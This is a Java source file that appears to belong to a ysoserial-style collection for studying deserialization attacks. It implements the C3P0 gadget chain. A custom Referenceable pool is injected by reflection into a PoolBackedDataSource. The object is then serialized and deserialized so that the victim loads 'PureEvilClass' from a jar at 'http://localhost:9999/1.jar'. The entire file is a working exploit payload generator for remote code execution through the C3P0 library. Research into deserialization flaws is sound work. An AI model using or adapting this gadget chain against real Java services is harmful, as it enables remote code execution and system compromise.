package org.su18.serialize.ysoserial.C3P0;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import org.su18.serialize.utils.ClassUtil;
import org.su18.serialize.utils.SerializeUtil;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * @author su18
 */
public class C3P0 {

	private static final class MyPool implements ConnectionPoolDataSource, Referenceable {

		private String className;

		private String url;

		public MyPool(String className, String url) {
			this.className = className;
			this.url = url;
		}

		public Reference getReference() throws NamingException {
			return new Reference("su18", this.className, this.url);
		}

		public PrintWriter getLogWriter() throws SQLException {
			return null;
		}

		public void setLogWriter(PrintWriter out) throws SQLException {
		}

		public void setLoginTimeout(int seconds) throws SQLException {
		}

		public int getLoginTimeout() throws SQLException {
			return 0;
		}

		public Logger getParentLogger() throws SQLFeatureNotSupportedException {
			return null;
		}

		public PooledConnection getPooledConnection() throws SQLException {
			return null;
		}

		public PooledConnection getPooledConnection(String user, String password) throws SQLException {
			return null;
		}

	}

	public static void main(String[] args) throws Exception {

		PoolBackedDataSource     p    = (PoolBackedDataSource) ClassUtil.createInstanceUnsafely(PoolBackedDataSource.class);
		ConnectionPoolDataSource pool = new MyPool("org.su18.serializable.PureEvilClass", "http://localhost:9999/1.jar");

		Field field = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
		field.setAccessible(true);
		field.set(p, pool);

		SerializeUtil.writeObjectToFile(p);
		SerializeUtil.readFileObject();
	}

}
